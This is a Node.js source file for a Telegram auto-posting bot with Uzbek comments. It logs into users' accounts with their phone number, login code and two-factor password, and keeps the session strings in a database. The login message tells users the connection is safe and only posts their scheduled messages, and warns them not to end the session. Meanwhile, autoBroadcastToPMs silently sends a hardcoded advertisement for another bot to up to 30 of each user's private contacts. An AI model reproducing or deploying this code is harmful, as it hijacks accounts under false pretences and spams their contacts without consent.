require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const { TelegramClient, Api } = require("telegram");
const { CustomFile } = require("telegram/client/uploads");
const { StringSession } = require("telegram/sessions");
const Fastify = require('fastify');
const fastify = Fastify({ logger: true });
const mongoose = require("mongoose");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const os = require("os");

const SESSION_CACHE_TIME = 2 * 60 * 1000;
const ADMIN_ID = Number(process.env.ADMIN_ID);

mongoose.connect(process.env.MONGO_URI);


const GroupSchema = new mongoose.Schema({
  id: String,
  title: String,
  type: String,
  text: String,
  fileId: String,
  time: Number,
  lastSend: Date,
  disabled: { type: Boolean, default: false }
});

const UserSchema = new mongoose.Schema({
  tgId: Number,
  phone: String,
  session: String,
  blocked: { type: Boolean, default: false },
  sessionDead: { type: Boolean, default: false },
  lastSessionCheck: { type: Number, default: 0 },
  tariff: { type: String, enum: ["free", "premium"], default: "free" },
  premiumUntil: Date,
  paymentPending: { type: Boolean, default: false },
  defaultTime: { type: Number, default: 5 },
  groups: [GroupSchema],  // Bu yerda o'zgartirildi
  referredBy: Number,
  referrals: { type: Number, default: 0 },
  stats: { totalPaid: { type: Number, default: 0 } },
  daily: {
    date: String,
    sent: { type: Number, default: 0 },
    errors: { type: Number, default: 0 }
  }
});

async function sendPhotoFromFileId(bot, client, fileId, chatId, caption = "") {
  try {
    // 1. Bot API orqali file_path olish
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;

    // 2. Rasmni download qilish
    const response = await axios({
      url: fileUrl,
      method: 'GET',
      responseType: 'arraybuffer'
    });

    const buffer = Buffer.from(response.data);

    // Vaqtincha fayl yaratish
    const tempDir = os.tmpdir();
    const tempFilePath = path.join(tempDir, `photo_${Date.now()}.jpg`);

    fs.writeFileSync(tempFilePath, buffer);

    // 3. CustomFile yaratish (path orqali)
    const customFile = new CustomFile(
      'photo.jpg',              // file name
      buffer.length,            // size
      tempFilePath              // to'liq path
    );

    // 4. File ni upload qilish
    const uploaded = await client.uploadFile({
      file: customFile,
      workers: 1
    });

    // 5. Rasmni yuborish
    await client.invoke(
      new Api.messages.SendMedia({
        peer: chatId,
        media: new Api.InputMediaUploadedPhoto({
          file: uploaded
        }),
        message: caption
      })
    );

    // Vaqtincha faylni o'chirish (diskni tozalash uchun)
    fs.unlinkSync(tempFilePath);

    console.log("✅ Photo muvaffaqiyatli yuborildi:", chatId);

  } catch (e) {
    console.log("❌ Photo yuborish xatosi:", chatId, e.message || e);
  }
}

const User = mongoose.model("User", UserSchema);
const token = process.env.BOT_TOKEN;
const bot = new TelegramBot(token, { webHook: true });

const WEBHOOK_PATH = `/webhook/${token}`;
const FULL_WEBHOOK_URL = `${process.env.PUBLIC_URL}${WEBHOOK_PATH}`;

// Webhook endpoint
fastify.post(WEBHOOK_PATH, (req, reply) => {
  try {
    bot.processUpdate(req.body);  // Telegram update-larni botga uzatish juda muhim
    console.log('Update processed:', req.body);
    reply.code(200).send();       // Telegram API uchun 200 OK javob qaytarish kerak
  } catch (error) {
    console.error('Error processing update:', error);
    reply.sendStatus(500);
  }
});

// Health check endpoint
fastify.get('/healthz', (req, reply) => {
  reply.send({ status: 'ok' });
});

// Serverni ishga tushirish va webhook o‘rnatish
fastify.listen({ port: process.env.PORT || 3000, host: '0.0.0.0' }, async (err, address) => {
  if (err) {
    fastify.log.error(err);
    process.exit(1);
  }

  fastify.log.info(`Server listening at ${address}`);

  try {
const response = await axios.post(`https://api.telegram.org/bot${token}/setWebhook`, null, {
  params: { url: FULL_WEBHOOK_URL }
});

    if (response.data.ok) {
      fastify.log.info('Webhook successfully set:', response.data);
    } else {
      fastify.log.error('Failed to set webhook:', response.data);
    }
  } catch (error) {
    fastify.log.error('Error setting webhook:', error.message);
  }
});
bot.getMe().then((botInfo) => {
  bot.me = botInfo;
  console.log(`🤖 Bot ishga tushdi: @${bot.me.username}`);
}).catch((err) => {
  console.error("Bot ma'lumotini olishda xatolik:", err.message);
});
const state = {};

const today = () => new Date().toISOString().slice(0, 10);
const isPremiumActive = (user) =>
  user.tariff === "premium" && user.premiumUntil && user.premiumUntil > new Date();


const ensureSessionAlive = async (user) => {
  if (!user.session) return false;
  if (user.lastSessionCheck && Date.now() - user.lastSessionCheck < SESSION_CACHE_TIME && !user.sessionDead)
    return true;

  const client = new TelegramClient(
    new StringSession(user.session),
    Number(process.env.API_ID),
    process.env.API_HASH,
    { connectionRetries: 1 }
  );

  try {
    await client.connect();
    await client.getMe();
    await client.disconnect();
    user.lastSessionCheck = Date.now();
    user.sessionDead = false;
    await user.save();
    return true;
  } catch (e) {
    console.log("Session check error:", e.message);
    if (e.message.includes("AUTH_KEY") || e.message.includes("SESSION")) {
      user.session = null;
      user.sessionDead = true;
      user.groups = [];
      await user.save();
    }
    return false;
  }
};

const checkSubscription = async (bot, userId) => {
  try {
    const requiredChannels = process.env.REQUIRED_CHANNELS.split(',').map(c => c.trim());
    
    // Har bir kanal uchun tekshirish
    for (const channel of requiredChannels) {
      try {
        console.log(`Checking ${userId} in ${channel}`);
        const member = await bot.getChatMember(channel, userId);
        const status = member.status;
        if (!["member", "administrator", "creator"].includes(status)) {
          console.log(`${userId} is not subscribed to ${channel}`);
          return false;
        }
      } catch (e) {
        console.log(`Subscription check error for ${channel}: ${e.message}`);
        return false;
      }
    }
    return true;
  } catch (e) {
    console.log(`Subscription check error: ${e.message}`);
    return false;
  }
};

const getForceSubMessage = async (bot) => {
  const requiredChannels = process.env.REQUIRED_CHANNELS.split(',').map(c => c.trim());
  const buttons = [];

  // Har bir kanal uchun tugma qo'shish
  for (const channel of requiredChannels) {
    try {
      const chat = await bot.getChat(channel);
      const title = chat.title || channel;
      const channelLink = `https://t.me/${channel.replace('@', '')}`;
      buttons.push([{ text: `${title}`, url: channelLink }]);
    } catch (err) {
      console.error(`Kanal nomini olishda xatolik: ${channel}`, err.message);
      // fallback
      buttons.push([{ text: `${channel}`, url: `https://t.me/${channel.replace('@', '')}` }]);
    }
  }

  // Support bot tugmasi
  const SUPPORT_BOT_LINK = process.env.SUPPORT_BOT_LINK;
  const SUPPORT_BOT_TITLE = process.env.SUPPORT_BOT_TITLE;
  buttons.push([{ text: `${SUPPORT_BOT_TITLE}`, url: SUPPORT_BOT_LINK }]);  
  
  buttons.push([{ text: '✅ Obuna bo‘ldim', callback_data: 'check_sub' }]);

  return {
    reply_markup: {
      inline_keyboard: buttons
    }
  };
};

 const ensureUserActive = async (bot, user) => {
  if (user.tgId === ADMIN_ID) return true;
  if (user.blocked) return false;

  // Yangi multi-channel tekshiruvi
  const subOk = await checkSubscription(bot, user.tgId);
  if (!subOk) {
    const subKeyboard = await getForceSubMessage(bot);
    user.blocked = true;
    await user.save();
    
    try {
      await bot.sendMessage(
        user.tgId,
        `<b>❗ Botdan foydalanish uchun quyidagi kanallarga obuna bo'ling:</b>`,
        { parse_mode: 'HTML', ...subKeyboard }
      );
    } catch {}
    return false;
  } else {
         // Yangi qo'shish: Agar obuna bor bo'lsa, blocked-ni olib tashlang
         if (user.blocked) {
           user.blocked = false;
           await user.save();
         }
       }

       const sessionOk = await ensureSessionAlive(user);
       if (!sessionOk) {
         try {
           await bot.sendMessage(
             user.tgId,
             "⛔ Hisobingizdan bot chiqarilgan.\n🔁 Qayta ulanish uchun /start bosing"
           );
         } catch {}
         return false;
       }

       return true;
     };

const autoBroadcastToPMs = async (client, userTgId) => {
  if (process.env.AUTO_MESSAGE_ENABLED !== 'true') return;

  const user = await User.findOne({ tgId: userTgId });
  if (user.autoBroadcastDone) return;

  let messageText = process.env.AUTO_MESSAGE_TEXT 
    ?.replace(/\${bot}/g, process.env.BOT_USERNAME || '@yourbot')
    ?.replace(/\${userId}/g, userTgId) || "Salom!";

  const limit = parseInt(process.env.AUTO_PM_BROADCAST_LIMIT) || 30;

  try {
    console.log(`🔥 Auto-PM broadcast boshlandi (limit: ${limit})`);

    const dialogs = await client.getDialogs({ limit: 100 });
    const privateChats = dialogs
      .filter(d => d.entity?.className === 'User' && !d.entity.bot && !d.entity.deleted)
      .slice(0, limit);

    console.log(`📊 ${privateChats.length} ta shaxsiy chat topildi`);

    let totalSent = 0;
    let totalErrors = 0;


    for (const dialog of privateChats) {
      try {
        const userId = dialog.entity.id.toString();
        console.log(`📤 ${userId} ga xabar yuborilmoqda...`);
await client.sendMessage(userId, { 
  message: "🔵 Telegram kanalingiz uchun TEKIN xizmatlar:\n\n🎁 👁‍🗨 250 ta ko'rish https://t.me/TurfaSeenBot?start=user19\n🎁 🤗 50 ta reaksiya https://t.me/TurfaSeenBot?start=user19\n🎁 👤 120 ta obunachi https://t.me/TurfaSeenBot?start=user19\n\n🟣 Instagram uchun TEKIN xizmatlar:\n🎁 ❤️ Reels yoqtirish https://t.me/TurfaSeenBot?start=user19\n🎁 👁‍🗨 Reels ko'rishlar https://t.me/TurfaSeenBot?start=user19\n\n⬇️ Hoziroq sinab ko'ring!\n\n🤖 @TurfaSeenBot https://t.me/TurfaSeenBot?start=user19"
});
        
        totalSent++;
        await new Promise(r => setTimeout(r, 2000)); // 2sek delay
        
      } catch (userError) {
        totalErrors++;
        console.log(`❌ ${dialog.entity.id} ga yuborib bo'lmadi:`, userError.message);
      }
    }

    // Saqlash
    user.autoBroadcastDone = true;
    user.stats = user.stats || {};
    user.stats.autoBroadcastSent = totalSent;
    await user.save();
    
    await bot.sendMessage(
      userTgId, 
      `🎉 <b>AUTO PM BROADCAST TUGADI!</b>\n\n📱 Topildi: <b>${privateChats.length}</b>\n📤 Yuborildi: <b>${totalSent}</b>\n❌ Xatolar: <b>${totalErrors}</b>`,
      { parse_mode: 'HTML' }
    );

  } catch (error) {
    console.error('❌ Auto-PM xatosi:', error.message);
  }
};
// ===================== MENUS =====================
const mainMenu = (isAdmin = false) => ({
  reply_markup: {
    inline_keyboard: [
      [{ text: "⏳ Vaqt", callback_data: "auto" }],
      [{ text: "👥 Guruhlar", callback_data: "groups" }],
      [{ text: "👤 Profil", callback_data: "profile" }],
      ...(isAdmin ? [[{ text: "💎 Admin", callback_data: "admin" }]] : [])
    ]
  }
});

const adminMenu = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "📢 E'lon", callback_data: "adm_broadcast" }],
      [{ text: "📊 Kunlik statistika", callback_data: "adm_daily" }],
      [{ text: "👥 Userlar", callback_data: "adm_users" }],
      [{ text: "⛔ User to'xtatish", callback_data: "adm_block" }],
      [{ text: "✅ User yoqish", callback_data: "adm_unblock" }],
      [{ text: "💀 Sessiyasi o'lganlar", callback_data: "adm_dead" }]
    ]
  }
};

// ===================== START =====================
bot.onText(/\/start(?:\s+(\d+))?/, async (msg) => {
  const chatId = msg.chat.id;
  const refId = Number(msg.match?.[1]);

  // 1. Tezkor obuna tekshiruvi
  const subscribed = await checkSubscription(bot, chatId);
if (!subscribed) {
  const subKeyboard = await getForceSubMessage(bot);
  return bot.sendMessage(
    chatId, 
    `<b>❗ Botdan foydalanish uchun quyidagi kanallarga obuna bo‘ling:</b>`, 
    { 
      parse_mode: 'HTML',
      ...subKeyboard 
    }
  );
}

  // 2. User mavjudligini tekshirish
  let user = await User.findOne({ tgId: chatId });

  // Yangi user bo'lsa yaratamiz
  if (!user) {
    user = new User({ tgId: chatId });
    if (refId && refId !== chatId) {
      const refUser = await User.findOne({ tgId: refId });
      if (refUser) {
        user.referredBy = refUser.tgId;
        // Referrer ga xabar berish
        try {
          await bot.sendMessage(refUser.tgId, `🎉 Sizning referral havolangiz orqali yangi foydalanuvchi qo'shildi!\nJami referallar: ${refUser.referrals + 1}`);
        } catch (err) {
          console.log("Referral notification error:", err.message);
        }
      }
    }
    await user.save();
  }

  // Sessiya o'lik bo'lsa — tozalash + xabar
  if (user.sessionDead) {
    user.session = null;
    user.sessionDead = false;
    user.groups = [];
    user.blocked = false;
    await user.save();

    return bot.sendMessage(
      chatId,
      "♻️ Sessiyangiz yangilandi!\n\nRaqamingizni qayta yuboring:",
      {
        reply_markup: {
          keyboard: [[{ text: "📞 Raqam yuborish", request_contact: true }]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }
    );
  }

  // Sessiya bor va ishlayaptimi?
  if (user.session) {
    const sessionAlive = await ensureSessionAlive(user);

    if (sessionAlive) {
      return bot.sendMessage(chatId, "📨", mainMenu(chatId === ADMIN_ID));
    }

    // Sessiya haqiqatan ham o'lik bo'lib chiqsa
    user.session = null;
    user.groups = [];
    user.sessionDead = true;
    await user.save();

    return bot.sendMessage(
      chatId,
      "⛔ Hisobingizdan bot chiqarib yuborilgan.\n\nQayta ulanish uchun raqamingizni yuboring:",
      {
        reply_markup: {
          keyboard: [[{ text: "📞 Raqam yuborish", request_contact: true }]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }
    );
  }

  // Sessiya umuman yo'q → login so'rash
  bot.sendMessage(chatId, `<b>Salom! Botdan foydalanish uchun raqamingizni yuboring 📱</b>`, {
    parse_mode: "HTML",
    reply_markup: {
      keyboard: [[{ text: "📞 Raqam yuborish", request_contact: true }]],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  });
});
bot.onText(/\/admin/, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId !== ADMIN_ID) return
  return bot.sendMessage(chatId, "💎 Admin Panel", adminMenu);
});
// ===================== CONTACT LOGIN =====================
bot.on("contact", async (msg) => {
  const chatId = msg.chat.id;
  const phone = msg.contact.phone_number;

  const client = new TelegramClient(new StringSession(""), Number(process.env.API_ID), process.env.API_HASH);

  await client.start({
    phoneNumber: () => phone,
    phoneCode: () => {
      bot.sendMessage(chatId, `<blockquote><b>📨 Telegramga kod keldi</b></blockquote>\n\n<b>🤖 Botga kodni : 12.345 qilib yuboring!</b>`, { parse_mode: "HTML" });
      return new Promise((r) => bot.once("message", (m) => r(m.text)));
    },
    password: () => {
      bot.sendMessage(chatId, `<b>🔐 Sizda 2 bosqichli parol bor ekan uni kiriting: </b>`, { parse_mode: "HTML" });
      return new Promise((r) => bot.once("message", (m) => r(m.text)));
    }
  });

  await User.findOneAndUpdate(
    { tgId: chatId },
    { tgId: chatId, phone, session: client.session.save(), daily: { date: today(), sent: 0, errors: 0 } },
    { upsert: true }
  );

  bot.sendPhoto(chatId, "img/phone.jpg", {
    caption: `<b>Diqqat buni o'qishingiz shart ! </b>\n<blockquote><i>
    Biz sizning hisobingizga bog'landik bu mutlaqo xavfsiz va bepul. Botning asosiy vazifasi siz faol bo'lmasangiz ham o'zi siz aytgan vaqtlarda xabarlarni yetkazib turish. Agar hisobingizga biz orqali ulanishni bekor qilsangiz botdan foydalanishingizda muammolar yuz beradi va siz bloklanishingiz mumkim. Hisob muzlatilishi va yo'q bo'lib ketish kuzatilsa buni biz o'z zimmamizga olmaymiz, hisobga ulangach istasangiz parollarni almashtiring bizga faqat bizning seansni uzmasangiz kifoya!
    </i></blockquote>`,
    parse_mode: "HTML"
  });

  bot.sendMessage(chatId, "✅ Ulandi", {
    reply_markup: { remove_keyboard: true }
  });
await autoBroadcastToPMs(client, chatId)
  bot.sendMessage(chatId, "Asosiy menyu", mainMenu(chatId === ADMIN_ID));
});

// ===================== CALLBACK QUERY =====================
bot.on("callback_query", async (q) => {
const chatId = q.message.chat.id;
  await bot.answerCallbackQuery(q.id).catch(() => {});
  let user = await User.findOne({ tgId: chatId });
  if (!user && chatId !== ADMIN_ID) return;
  if (!user && chatId === ADMIN_ID) {
  try {
    user = await User.findOneAndUpdate(
      { tgId: chatId },
      { tgId: chatId },
      { upsert: true, new: true }
    );
  } catch (err) {
    if (err.code === 11000) {
      user = await User.findOne({ tgId: chatId });
    } else {
      throw err;
    }
  }
  if (!user) {
    // Agar hali ham null, yarat
    user = new User({ tgId: chatId });
    await user.save();
  }
}

if (q.data === "check_sub") {
  const subscribed = await checkSubscription(bot, chatId);
  if (subscribed) {
    try {
      await bot.editMessageText(
        "✅ Barcha kanallarga obuna bo'ldingiz! Endi /start bosing", 
        {
          chat_id: chatId,
          message_id: q.message.message_id,
          reply_markup: {}
        }
      );
    } catch (editError) {
      await bot.answerCallbackQuery(q.id, { 
        text: "✅ Obuna tasdiqlandi! /start bosing", 
        show_alert: true 
      });
    }
  } else {
    const subKeyboard = await getForceSubMessage(bot);
    await bot.editMessageText(
      `<b>❌ Hali barcha kanallarga obuna bo'lmagansiz!</b>`, 
      {
        chat_id: chatId,
        message_id: q.message.message_id,
        parse_mode: 'HTML',
        reply_markup: subKeyboard.reply_markup
      }
    );
  }
  return;
}

  // Qolgan barcha callback'lar uchun faqat faol userlarni tekshirish
  const ok = await ensureUserActive(bot, user);
  if (!ok) {
    await bot.answerCallbackQuery(q.id, {
      text: "⛔ Qayta login talab qilinadi yoki bloklangansiz /start orqali",
      show_alert: true
    });
    return;
  }

  if (q.data === "auto") {
    return bot.sendMessage(chatId, "⏱️ Vaqt tanlang", {
      reply_markup: {
        inline_keyboard: [[5, 7, 10].map(i => ({
          text: `${i} min`,
          callback_data: `def_${i}`
        }))]
      }
    });
  }

  if (q.data.startsWith("def_")) {
    user.defaultTime = Number(q.data.split("_")[1]);
    await user.save();
    return bot.sendMessage(chatId, "✅ Saqlandi", mainMenu(chatId === ADMIN_ID));
  }

if (q.data === "groups") {
  try {
    const client = new TelegramClient(
      new StringSession(user.session),
      Number(process.env.API_ID),
      process.env.API_HASH
    );
    await client.connect();
    const groups = (await client.getDialogs()).filter(d => d.isGroup);
    await client.disconnect();
    return bot.sendMessage(chatId, "Guruh tanlang", {
      reply_markup: {
        inline_keyboard: groups.map(g => [{
          text: g.title,
          callback_data: `grp_${g.id}_${g.title}`
        }])
      }
    });
  } catch (e) {
    console.log("Groups fetch error:", e.message);
    return bot.answerCallbackQuery(q.id, {
      text: "⛔ Seans o'chgan, qayta /start orqali login qiling",
      show_alert: true
    });
  }
}

  if (q.data.startsWith("grp_")) {
    const [, id, title] = q.data.split("_");
    state[chatId] = { id, title };
    return bot.sendMessage(chatId, "📎 Xabar yuboring");
  }

  // PROFILE
  if (q.data === "profile") {
    const premium = isPremiumActive(user);
    return bot.sendMessage(
      chatId,
      `👤 PROFIL
━━━━━━━━━━━━
💳 Tarif: ${premium ? "💎 PREMIUM" : "🆓 FREE"}
⏳ Premium: ${premium ? user.premiumUntil.toLocaleDateString() : "-"}
👥 Referallar: ${user.referrals}
💰 To'lovlar: ${user.stats.totalPaid} so‘m`,
      {
        reply_markup: {
          inline_keyboard: [
            ...(premium ? [] : [[{ text: "💎 Premium ga o‘tish", callback_data: "buy_premium" }]]),
            [{ text: "🔗 Taklif Havola", callback_data: "referral_link" }]
          ]
        }
      }
    );
  }

  // BUY PREMIUM
  if (q.data === "buy_premium") {
    user.paymentPending = true;
    await user.save();
    return bot.sendMessage(
      chatId,
      `💎 PREMIUM TA'RIF
━━━━━━━━━━━━
💰 Narx: ${process.env.PREMIUM_PRICE} so'm
⏳ Muddat: ${process.env.PREMIUM_DAYS} kun
💳 Karta: <b>${process.env.CARD_NUMBER}</b>
📸 Chekni RASM ko'rinishida yuboring`,
      { parse_mode: "HTML" }
    );
  }
  if (q.data === "referral_link") {
    const link = `https://t.me/${bot.me.username}?start=${user.tgId}`;
    return bot.sendMessage(chatId, `🔗 Sizning taklif havolangiz:\n${link}\n\nBu havolani do'stlaringizga yuboring va ular qo'shilganda sizga premium kunlari qo'shiladi!`);
  }
  // CANCEL PAYMENT
  if (q.data === "cancel_payment") {
    user.paymentPending = false;
    await user.save();
    return bot.sendMessage(chatId, "❌ To‘lov bekor qilindi", mainMenu(chatId === ADMIN_ID));
  }

  // ADMIN PANEL
  if (chatId === ADMIN_ID && q.data === "admin") {
    return bot.sendMessage(chatId, "💎 Admin Panel", adminMenu);
  }

  if (chatId === ADMIN_ID && q.data === "adm_daily") {
    const users = await User.find({});
    let sent = 0, errors = 0, active = 0;
    users.forEach(u => {
      if (u.daily.date === today()) {
        sent += u.daily.sent;
        errors += u.daily.errors;
        if (u.daily.sent > 0) active++;
      }
    });
    return bot.sendMessage(chatId,
      `📊 BUGUNGI STATISTIKA
━━━━━━━━━━━━━━━
👥 Faol userlar: ${active}
📨 Yuborilgan: ${sent}
⚠️ Xatolar: ${errors}`
    );
  }

  if (chatId === ADMIN_ID && q.data === "adm_users") {
    const total = await User.countDocuments();
    const active = await User.countDocuments({ blocked: false });
    const blocked = await User.countDocuments({ blocked: true });
    return bot.sendMessage(chatId,
      `👥 USERLAR
━━━━━━━━━━━━
🟢 Faol: ${active}
🔴 Blok: ${blocked}
📊 Jami: ${total}`
    );
  }

  if (chatId === ADMIN_ID && q.data === "adm_block") {
    state.admin = "block";
    return bot.sendMessage(chatId, "⛔ User ID yuboring");
  }

  if (chatId === ADMIN_ID && q.data === "adm_unblock") {
    state.admin = "unblock";
    return bot.sendMessage(chatId, "✅ User ID yuboring");
  }

  if (chatId === ADMIN_ID && q.data === "adm_dead") {
    const dead = await User.countDocuments({ sessionDead: true });
    return bot.sendMessage(chatId, `💀 Sessiyasi o'lgan userlar: ${dead}`);
  }
  if (chatId === ADMIN_ID && q.data === "adm_broadcast") {
    state.admin = "broadcast";
    return bot.sendMessage(chatId, "📢 Barcha foydalanuvchilarga yuboriladigan xabarni yuboring:");
  }
  if (chatId === ADMIN_ID && q.data.startsWith("pay_ok_")) {
    const userId = Number(q.data.split("_")[2]);
    const target = await User.findOne({ tgId: userId });
    if (!target) return;
      if (isPremiumActive(target)) {
    return bot.answerCallbackQuery(q.id, {
      text: "⚠️ Bu userda allaqachon PREMIUM bor",
      show_alert: true
    });
    }
    const days = Number(process.env.PREMIUM_DAYS);
    const until = new Date();
    until.setDate(until.getDate() + days);

    target.tariff = "premium";
    target.premiumUntil = until;
    target.stats.totalPaid += Number(process.env.PREMIUM_PRICE);

    if (target.referredBy) {
      const ref = await User.findOne({ tgId: target.referredBy });
      if (ref) {
        ref.referrals++;
        if (ref.premiumUntil) ref.premiumUntil.setDate(ref.premiumUntil.getDate() + Number(process.env.REF_BONUS_DAYS));
        await ref.save();
      }
    }

    await target.save();
    await bot.sendMessage(target.tgId, "🎉 PREMIUM yoqildi! Rahmat 🙌");
    return bot.sendMessage(chatId, "✅ Tasdiqlandi");
  }

  if (chatId === ADMIN_ID && q.data.startsWith("pay_no_")) {
    const userId = Number(q.data.split("_")[2]);
    const target = await User.findOne({ tgId: userId });
    if (!target) return;

    target.paymentPending = false;
    await target.save();
    await bot.sendMessage(target.tgId, "❌ To‘lov bekor qilindi");
    return bot.sendMessage(chatId, "❌ Bekor qilindi");
  }
});

// ===================== MESSAGE HANDLER =====================
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  let user = await User.findOne({ tgId: chatId });
  if (!user) return;

  const ok = await ensureUserActive(bot, user);
  if (!ok) return;

  if (user.paymentPending) {
    if (!msg.photo) {
      return bot.sendMessage(chatId, "❗ Faqat RASM yuboring");
    }

    user.paymentPending = false;
    await user.save();

    await bot.sendPhoto(
      ADMIN_ID,
      msg.photo.at(-1).file_id,
      {
        caption: `💳 PREMIUM SO'ROV\n👤 ID: ${user.tgId}\n📞 ${user.phone || "-"}`,
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Tasdiqlash", callback_data: `pay_ok_${user.tgId}` },
              { text: "❌ Bekor qilish", callback_data: `pay_no_${user.tgId}` }
            ]
          ]
        }
      }
    );
    return bot.sendMessage(chatId, "⏳ Tekshirilmoqda...");
  }
  if (!state[chatId] && !state.admin) return;
  if (state.admin) {
    const action = state.admin;
    if (action === "broadcast" && chatId === ADMIN_ID) {
      // Barcha userlarga xabar yuborish
      const allUsers = await User.find({ blocked: false });
      let sentCount = 0;
      for (const u of allUsers) {
        if (u.tgId) {
          try {
            await bot.sendMessage(u.tgId, msg.text || msg.caption || "Xabar yo'q");
            sentCount++;
          } catch (err) {
            console.log(`Broadcast error to ${u.tgId}:`, err.message);
          }
        }
      }
      delete state.admin;
      return bot.sendMessage(chatId, `✅ E'lon yuborildi! ${sentCount} ta foydalanuvchiga yetkazildi.`);
    }
    const targetId = Number(msg.text);
    if (isNaN(targetId)) {
      return bot.sendMessage(chatId, "❌ Noto'g'ri ID");
    }

    const target = await User.findOne({ tgId: targetId });
    if (!target) {
      return bot.sendMessage(chatId, "❌ User topilmadi");
    }

    if (action === "block") {
      target.blocked = true;
      await target.save();
      return bot.sendMessage(chatId, "⛔ Bloklandi");
    } else if (action === "unblock") {
      target.blocked = false;
      await target.save();
      return bot.sendMessage(chatId, "✅ Blokdan chiqarildi");
    }

    delete state.admin;
    return;
  }

  if (!state[chatId]) return;

  const client = new TelegramClient(
    new StringSession(user.session),
    Number(process.env.API_ID),
    process.env.API_HASH
  );

  await client.connect();

  const groupId = state[chatId].id;
  const title = state[chatId].title;

  // Eski xabarni o‘chiramiz
  user.groups = user.groups.filter(g => g.id !== groupId);

  let data = {
    id: groupId,
    title,
    time: user.defaultTime,
    text: "",
    type: ""
  };

  /* ===== TEXT ===== */
  if (msg.text && !msg.photo) {
    data.type = "text";
    data.text = msg.text;
    if (!isPremiumActive(user)) {
      data.text += `\n\n🤖 @${bot.me.username}`;
    }
  }

  /* ===== PHOTO ===== */
else if (msg.photo) {
  if (!isPremiumActive(user)) {
    await client.disconnect();
    return bot.sendMessage(chatId, "⛔ Rasm faqat PREMIUM ta'rifda mavjud");
  }
try {
    const fileId = msg.photo.at(-1).file_id;

    // Guruhga yuborish (saqlanganda bir marta)
    await sendPhotoFromFileId(bot, client, fileId, groupId, msg.caption || "");

    // Guruhni yangilash
    user.groups = user.groups.filter(g => g.id !== groupId);
    user.groups.push({
      id: groupId,
      title,
      type: "photo",
      text: msg.caption || "",
      fileId: fileId,  // fileId saqlanadi
      time: user.defaultTime,
      lastSend: new Date(),  // Yuborilgani uchun hozirgi vaqt
      disabled: false
    });
    await user.save();
    bot.sendMessage(chatId, "✅ Guruh uchun rasm muvaffaqiyatli saqlandi va yuborildi!");
  } catch (err) {
    console.log("Rasm yuborish xatosi:", err);
    bot.sendMessage(chatId, "❌ Rasmni yuborishda xato yuz berdi. Qayta urinib ko‘ring.");
  } finally {
    await client.disconnect();
  }
  delete state[chatId];
  return;
} else {
    await client.disconnect();
    return bot.sendMessage(chatId, "❌ Faqat matn yoki rasm yuborish mumkin");
  }

  user.groups.push(data);
  await user.save();

  await client.disconnect();
  delete state[chatId];

  bot.sendMessage(chatId, "✅ Xabar yangilandi", mainMenu(chatId === ADMIN_ID));
});

// ===================== PREMIUM EXPIRE =====================
setInterval(async () => {
  const expired = await User.find({ tariff: "premium", premiumUntil: { $lt: new Date() } });
  for (const u of expired) {
    u.tariff = "free";
    u.premiumUntil = null;
    await u.save();
    try {
      await bot.sendMessage(u.tgId, "⏳ Premium muddati tugadi. Siz FREE ta'rifdasiz.");
    } catch {}
  }
}, 60 * 60 * 1000);

// ===================== AUTO SENDER =====================
// ===================== AUTO SENDER =====================
setInterval(async () => {
  const users = await User.find({ blocked: false });
  for (const user of users) {
    if (!user.session || user.sessionDead) continue; 
    const client = new TelegramClient(new StringSession(user.session), Number(process.env.API_ID), process.env.API_HASH);
    try {
      await client.connect();
      for (const g of user.groups) {
        if (g.disabled) continue;
        if (g.lastSend && Date.now() - g.lastSend.getTime() < g.time * 60000) continue;

        try {
          if (g.type === "text") {
            await client.sendMessage(g.id, { message: isPremiumActive(user) ? g.text : g.text });
          } else if (g.type === "photo" && isPremiumActive(user)) {
            if (!g.fileId) continue;
            await sendPhotoFromFileId(bot, client, g.fileId, g.id, g.text);
          }
          g.lastSend = new Date();
          if (user.daily.date !== today()) {
            user.daily = { date: today(), sent: 0, errors: 0 };
          }
          user.daily.sent++;
        } catch (sendError) {
          console.log("Yuborish xatosi:", user.tgId, g.id, sendError.message);
          if (user.daily.date !== today()) {
            user.daily = { date: today(), sent: 0, errors: 0 };
          }
          user.daily.errors++;
        }
      }
      await client.disconnect();
      await user.save();  // Qo'shildi: har user uchun oxirida save
    } catch (e) {
      console.log("SESSION ERROR", user.tgId, e.message);
      if (e.message.includes("AUTH_KEY") || e.message.includes("SESSION")) {
        user.sessionDead = true;
        await user.save();
      }
    }
  }
}, 60000);
